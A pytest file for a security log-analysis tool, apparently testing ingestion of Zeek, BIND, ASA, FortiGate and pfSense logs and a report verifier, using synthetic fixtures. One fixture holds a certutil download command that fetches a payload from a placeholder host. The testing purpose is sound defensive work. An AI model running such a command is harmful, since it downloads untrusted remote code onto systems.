"""
Unit tests for the DNS/flow visibility improvements driven by benchmark
evaluation (all fixtures are synthetic):

1. Zeek-style TSV ingestion: directive headers, #fields columns, unset markers.
2. BIND 9 query-log mapping: client, query name, record type extraction.
3. Epoch and BIND timestamp normalization.
4. Event inventory keyed by (action, event_code, status).
5. top_flows_by_bytes deterministic aggregate.
6. summary() surfaces bytes, geo, error codes and salient extras.
7. Supervisor analytics gate: pass without the family detector -> needs_retry.
8. Verifier citation-content consistency warnings.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from src.core.evidence import EvidenceEvent, get_store, parse_timestamp
from src.core.report_verifier import verify_report
from src.orchestrator.activities import _analytics_gate
from src.registry.ingestion import detect_format, ingest_file, load_mappings


@pytest.fixture()
def mappings():
    return load_mappings()


# ── TSV / Zeek ───────────────────────────────────────────


ZEEK_SAMPLE = (
    "#separator \\x09\n"
    "#set_separator\t,\n"
    "#empty_field\t(empty)\n"
    "#unset_field\t-\n"
    "#path\tdns\n"
    "#fields\tts\tuid\tid.orig_h\tid.resp_h\tid.orig_p\tid.resp_p\tproto\ttrans_id\trtt"
    "\tquery\tqclass\tqclass_name\tqtype\tqtype_name\trcode\trcode_name"
    "\tAA\tTC\tRD\tRA\tZ\tanswers\tTTLs\trejected\n"
    "1900000001.120000\tCabc1\t10.99.1.15\t10.99.0.2\t54210\t53\tudp\t1\t0.01"
    "\tbox.example.test\t1\tC_INTERNET\t16\tTXT\t0\tNOERROR"
    "\tF\tF\tT\tT\t0\t\"payload-ok\"\t1.0\tF\n"
    "1900000002.500000\tCabc2\t10.99.1.77\t10.99.0.2\t54211\t53\tudp\t2\t0.02"
    "\tzz9x8w7v.example-dga.test\t1\tC_INTERNET\t1\tA\t3\tNXDOMAIN"
    "\tF\tF\tT\tT\t0\t-\t-\tF\n"
)


def test_zeek_tsv_detected_and_fielded(tmp_path: Path, mappings):
    f = tmp_path / "sensor_dns.tsv"
    f.write_text(ZEEK_SAMPLE, encoding="utf-8")

    assert detect_format(f) == "tsv"
    events, outcome = ingest_file(f, mappings)

    assert outcome.mapping_id == "zeek_dns_tsv"
    assert len(events) == 2

    txt = events[0]
    assert txt.src_ip == "10.99.1.15"
    assert txt.dst_ip == "10.99.0.2"
    assert txt.event_code == "TXT"
    assert txt.status == "success"
    assert txt.extra["query"] == "box.example.test"
    assert txt.action == "dns_query"

    nx = events[1]
    assert nx.event_code == "A"
    assert nx.status == "failure"  # NXDOMAIN
    assert nx.extra["query"] == "zz9x8w7v.example-dga.test"
    # unset marker must not leak into fields
    assert nx.extra.get("answers", "") == ""


def test_plain_tsv_with_header_row(tmp_path: Path):
    from src.registry.ingestion import _iter_tsv

    f = tmp_path / "export.tsv"
    f.write_text("name\tvalue\nalpha\t1\nbeta\t2\n", encoding="utf-8")
    rows = list(_iter_tsv(f))
    assert len(rows) == 2
    assert rows[0][2] == {"name": "alpha", "value": "1"}


# ── BIND 9 ───────────────────────────────────────────────


BIND_SAMPLE = (
    "# BIND 9 query log\n"
    "14-Sep-2031 11:05:10.012 queries: info: client @0xdead 10.99.1.15#58120 "
    "(box.example.test): query: box.example.test IN TXT +E(0) (10.99.0.2)\n"
    "14-Sep-2031 11:05:11.300 queries: info: client @0xbeef 10.99.1.77#58121 "
    "(zz9x8w7v.example-dga.test): query: zz9x8w7v.example-dga.test IN A +E(0) (10.99.0.2)\n"
)


def test_bind9_querylog_mapping(tmp_path: Path, mappings):
    f = tmp_path / "named_queries.log"
    f.write_text(BIND_SAMPLE, encoding="utf-8")

    events, outcome = ingest_file(f, mappings)
    assert outcome.mapping_id == "bind9_querylog"
    assert len(events) == 2

    e = events[0]
    assert e.src_ip == "10.99.1.15"
    assert e.src_port == 58120
    assert e.dst_ip == "10.99.0.2"
    assert e.event_code == "TXT"
    assert e.extra["query"] == "box.example.test"
    assert e.timestamp.startswith("2031-09-14T11:05:10")


# ── Timestamps ───────────────────────────────────────────


def test_epoch_timestamp_parses_to_utc():
    assert parse_timestamp("1900000001.120000").startswith("2030-03-17T")
    assert parse_timestamp("1900000001").startswith("2030-03-17T")


def test_small_integers_are_not_epochs():
    # Ports/counters must never be misread as dates.
    assert parse_timestamp("8443") == "8443"
    assert parse_timestamp("443") == "443"


def test_bind_timestamp_format():
    assert parse_timestamp("14-Sep-2031 11:05:10.012") == "2031-09-14T11:05:10.012000"


# ── Inventory + flows ────────────────────────────────────


def test_inventory_splits_status(tmp_path: Path):
    store = get_store("dnsvis-inventory", )
    store.append(
        [
            EvidenceEvent(action="vpn_auth", event_code="X-1", status="failure"),
            EvidenceEvent(action="vpn_auth", event_code="X-1", status="failure"),
            EvidenceEvent(action="vpn_auth", event_code="X-2", status="success"),
        ]
    )
    inventory = store.stats()["event_inventory"]
    keys = {(r["action"], r["event_code"], r["status"]) for r in inventory}
    assert ("vpn_auth", "X-1", "failure") in keys
    assert ("vpn_auth", "X-2", "success") in keys


def test_top_flows_by_bytes_ranked_and_cited():
    store = get_store("dnsvis-flows")
    store.append(
        [
            EvidenceEvent(
                src_ip="10.9.0.8", dst_ip="203.0.113.9", dst_port=443,
                bytes_sent=3_000_000_000, bytes_received=100_000, action="allow",
            ),
            EvidenceEvent(
                src_ip="10.9.0.8", dst_ip="203.0.113.9", dst_port=443,
                bytes_sent=1_000, bytes_received=2_000, action="allow",
            ),
            EvidenceEvent(
                src_ip="10.9.0.5", dst_ip="203.0.113.77", dst_port=8443,
                bytes_sent=520, bytes_received=140, action="allow",
            ),
        ]
    )
    flows = store.stats()["top_flows_by_bytes"]
    assert flows[0]["dst_ip"] == "203.0.113.9"
    assert flows[0]["sessions"] == 2
    assert flows[0]["bytes_sent"] == 3_000_001_000
    assert flows[0]["example_ids"]
    assert flows[1]["dst_ip"] == "203.0.113.77"


# ── summary() surfaces decisive fields ───────────────────


def test_summary_shows_bytes_geo_and_query():
    net = EvidenceEvent(
        ev_id="EV-000001", src_ip="10.9.0.8", dst_ip="203.0.113.9", dst_port=443,
        bytes_sent=3_000_000_000, bytes_received=100_000, action="allow",
        geo={"country": "Testland"},
    )
    line = net.summary()
    assert "bytes_sent=3000000000" in line
    assert "geo=Testland" in line

    dns = EvidenceEvent(
        ev_id="EV-000002", src_ip="10.99.1.15", action="dns_query",
        event_code="TXT", extra={"query": "box.example.test"},
    )
    assert "query=box.example.test" in dns.summary()

    signin = EvidenceEvent(
        ev_id="EV-000003", user="user@example.test", action="signin",
        status="failure", error_code="500121",
        extra={"risk_detail": "impossibleTravel"},
    )
    line = signin.summary()
    assert "err=500121" in line
    assert "risk_detail=impossibleTravel" in line


# ── Analytics gate ───────────────────────────────────────


def _seed_auth_store(run: str):
    store = get_store(run)
    store.append(
        [
            EvidenceEvent(action="vpn_auth", event_code="A-1", status="failure", user="u1"),
            EvidenceEvent(action="vpn_auth", event_code="A-2", status="success", user="u1"),
        ]
    )
    return store


def test_gate_flags_missing_identity_analytics():
    _seed_auth_store("gate-auth-miss")
    feedback = _analytics_gate(
        "gate-auth-miss",
        {"auth_sequence_analysis", "evidence_query"},
        {"query_evidence"},
    )
    assert "analyze_auth_sequences" in feedback


def test_gate_satisfied_by_family_tool():
    _seed_auth_store("gate-auth-ok")
    feedback = _analytics_gate(
        "gate-auth-ok",
        {"auth_sequence_analysis"},
        {"analyze_auth_sequences"},
    )
    assert feedback == ""


def test_gate_ignores_absent_families():
    store = get_store("gate-no-net")
    store.append([EvidenceEvent(action="vpn_auth", event_code="A-1", status="failure")])
    # Network-analysis task, but the store has no network events: no gate.
    feedback = _analytics_gate(
        "gate-no-net", {"traffic_analysis"}, {"query_evidence"}
    )
    assert feedback == ""


def test_gate_ignores_unrelated_tasks():
    _seed_auth_store("gate-unrelated")
    feedback = _analytics_gate(
        "gate-unrelated", {"report_verification"}, set()
    )
    assert feedback == ""


# ── Citation consistency ─────────────────────────────────


def test_citation_mismatch_warns():
    store = get_store("vr-mismatch")
    store.append(
        [
            EvidenceEvent(
                timestamp="2031-01-01T00:00:00", src_ip="10.5.5.5",
                dst_ip="192.0.2.10", user="realuser",
                raw_excerpt="conn 10.5.5.5 -> 192.0.2.10",
            ),
            EvidenceEvent(
                timestamp="2031-01-01T00:01:00", src_ip="192.0.2.99",
                user="otheruser@example.test",
                raw_excerpt="signin otheruser@example.test from 192.0.2.99",
            ),
        ]
    )
    # 192.0.2.99 exists in the store but NOT in EV-000001 — mismatched binding.
    report = (
        "## Findings\n"
        "Traffic from 192.0.2.99 was observed at 00:00 UTC [EV-000001].\n"
    )
    result = verify_report(report, store=store, min_citation_coverage=0.0)
    assert any(
        i.kind == "citation_mismatch" and i.value == "192.0.2.99" for i in result.issues
    )
    # warn-level: verdict degrades but does not fail
    assert result.verdict == "warn"


def test_correct_binding_produces_no_mismatch():
    store = get_store("vr-match")
    store.append(
        [
            EvidenceEvent(
                timestamp="2031-01-01T00:00:00", src_ip="10.5.5.5",
                dst_ip="192.0.2.10",
                raw_excerpt="conn 10.5.5.5 -> 192.0.2.10",
            ),
        ]
    )
    report = "## Findings\nHost 10.5.5.5 connected to 192.0.2.10 at 00:00 UTC [EV-000001].\n"
    result = verify_report(report, store=store, min_citation_coverage=0.0)
    assert not any(i.kind == "citation_mismatch" for i in result.issues)


# ── Verifier grounding: derived labels, wildcards, tools ─


def _seed_grounded_store(run_id: str):
    store = get_store(run_id)
    store.append(
        [
            EvidenceEvent(
                timestamp="2031-02-01T00:00:00", src_ip="10.7.7.7",
                dst_ip="192.0.2.240", user="mfinance", host="WS-FIN-01",
                command_line="certutil.exe -urlcache -f http://x.test/p.bin",
                raw_excerpt="allow 10.7.7.7 -> 192.0.2.240 user=mfinance",
            ),
        ]
    )
    return store


def test_derived_label_with_grounded_ip_not_flagged():
    store = _seed_grounded_store("vr-derived")
    report = (
        "## Remediation\n"
        "Deploy rule `UAOS-Block-192.0.2.240` on the perimeter [EV-000001].\n"
    )
    result = verify_report(report, store=store, min_citation_coverage=0.0)
    assert not any(i.kind == "ungrounded_remediation_target" for i in result.issues)


def test_action_vocabulary_not_flagged():
    store = _seed_grounded_store("vr-actions")
    report = (
        "## Remediation\n"
        "Invoke `block_ip` and `isolate_endpoint` for 192.0.2.240 [EV-000001].\n"
    )
    result = verify_report(report, store=store, min_citation_coverage=0.0)
    assert not any(i.kind == "ungrounded_remediation_target" for i in result.issues)


def test_wildcard_ip_not_flagged():
    store = _seed_grounded_store("vr-wildcard")
    report = (
        "## Findings\n"
        "SYN flood used spoofed source 0.0.0.0 toward 192.0.2.240 [EV-000001].\n"
    )
    result = verify_report(report, store=store, min_citation_coverage=0.0)
    assert not any(
        i.kind == "ungrounded_ip" and i.value == "0.0.0.0" for i in result.issues
    )


def test_process_from_command_line_grounded():
    store = _seed_grounded_store("vr-proc")
    report = (
        "## Remediation\n"
        "Kill and quarantine `certutil.exe` on WS-FIN-01 [EV-000001].\n"
    )
    result = verify_report(report, store=store, min_citation_coverage=0.0)
    assert not any(
        i.kind == "ungrounded_remediation_target" and "certutil" in i.value.lower()
        for i in result.issues
    )


def test_fabricated_principal_still_fails():
    store = _seed_grounded_store("vr-fab")
    report = (
        "## Remediation\n"
        "Disable account `FAKEDOM\\ghost_admin` immediately [EV-000001].\n"
    )
    result = verify_report(report, store=store, min_citation_coverage=0.0)
    assert any(i.kind == "ungrounded_remediation_target" for i in result.issues)


# ── Flow context fields ──────────────────────────────────


def test_flow_carries_app_user_rule_context():
    store = get_store("flow-ctx")
    store.append(
        [
            EvidenceEvent(
                timestamp="2031-03-01T00:00:00", src_ip="10.8.8.8",
                dst_ip="192.0.2.50", dst_port=443, bytes_sent=1000,
                bytes_received=50, app_id="amazon-s3", user="svc-backup",
                extra={"rule": "Backup-To-Cloud"},
            ),
        ]
    )
    flow = store.stats()["top_flows_by_bytes"][0]
    assert flow["app_id"] == "amazon-s3"
    assert flow["user"] == "svc-backup"
    assert flow["rule"] == "Backup-To-Cloud"


# ── ASA action semantics ─────────────────────────────────


ASA_MIXED = (
    "<163>Sep 14 11:33:05 asa-core-01 %ASA-4-106023: Deny tcp src outside:198.51.100.220/40001 dst inside:10.10.10.20/22 by access-group \"OUTSIDE_IN\"\n"
    "<163>Sep 14 12:10:06 asa-core-01 %ASA-3-201011: Connection limit exceeded 10000/10000 for input packet from 203.0.113.88/48912 to 10.10.10.5/80 on interface outside\n"
    "<166>Sep 14 12:15:02 asa-core-01 %ASA-6-113015: AAA user authentication Rejected : reason = Invalid password : user = jsmith : user IP = 198.51.100.75\n"
)


def test_asa_actions_differentiate_by_message_id(tmp_path: Path, mappings):
    f = tmp_path / "asa_test.log"
    f.write_text(ASA_MIXED, encoding="utf-8")
    events, outcome = ingest_file(f, mappings)
    assert outcome.mapping_id == "cisco_asa_syslog"
    by_code = {e.event_code: e for e in events}
    assert by_code["%ASA-4-106023"].action == "acl_deny"
    assert by_code["%ASA-4-106023"].status == "failure"
    assert by_code["%ASA-4-106023"].dst_ip == "10.10.10.20"
    assert by_code["%ASA-4-106023"].dst_port == 22
    limit = by_code["%ASA-3-201011"]
    assert limit.action == "connection_limit_exceeded"
    assert limit.dst_ip == "10.10.10.5"
    assert by_code["%ASA-6-113015"].action == "vpn_auth"
    assert by_code["%ASA-6-113015"].status == "failure"


# ── FortiGate KVP mapping ────────────────────────────────


FORTI_SAMPLE = (
    '<190>date=2026-09-15 time=09:18:40 devname="FGT-CORP-FW01" devid="FG201FT000000001" '
    'eventtime=1789463920000000000 logid="0419016384" type="utm" subtype="ips" '
    'severity="critical" srcip=203.0.113.88 srcport=44121 dstip=172.16.10.80 dstport=80 '
    'action="dropped" attack="Apache.Log4j.Error.Log.Remote.Code.Execution" attackid=51006 '
    'msg="applications3: Apache.Log4j detected"\n'
)


def test_fortigate_kvp_mapping(tmp_path: Path, mappings):
    f = tmp_path / "fortigate_utm.log"
    f.write_text(FORTI_SAMPLE, encoding="utf-8")
    events, outcome = ingest_file(f, mappings)
    assert outcome.mapping_id == "fortigate_kvp"
    e = events[0]
    assert e.src_ip == "203.0.113.88"
    assert e.dst_ip == "172.16.10.80"
    assert e.dst_port == 80
    assert e.status == "failure"
    assert "Log4j" in e.extra.get("attack", "")
    assert e.extra.get("sensor") == "FGT-CORP-FW01"
    assert e.timestamp.startswith("2026-09-15")


def test_epoch_nanoseconds_scale():
    # 19-digit ns epoch must land in a sane year, not fail or misparse.
    parsed = parse_timestamp("1789463920000000000")
    assert parsed is not None and parsed.startswith("2026-")


# ── pfSense CSV column spellings ─────────────────────────


def test_generic_csv_pfsense_columns(tmp_path: Path, mappings):
    f = tmp_path / "fw_export.csv"
    f.write_text(
        "Timestamp,Action,SourceIP,SourcePort,DestinationIP,DestinationPort,Protocol\n"
        "2026-09-15T08:00:00,block,198.51.100.50,54120,192.0.2.50,21,tcp\n",
        encoding="utf-8",
    )
    events, _ = ingest_file(f, mappings)
    e = events[0]
    assert e.src_ip == "198.51.100.50"
    assert e.dst_ip == "192.0.2.50"
    assert e.src_port == 54120
    assert e.dst_port == 21
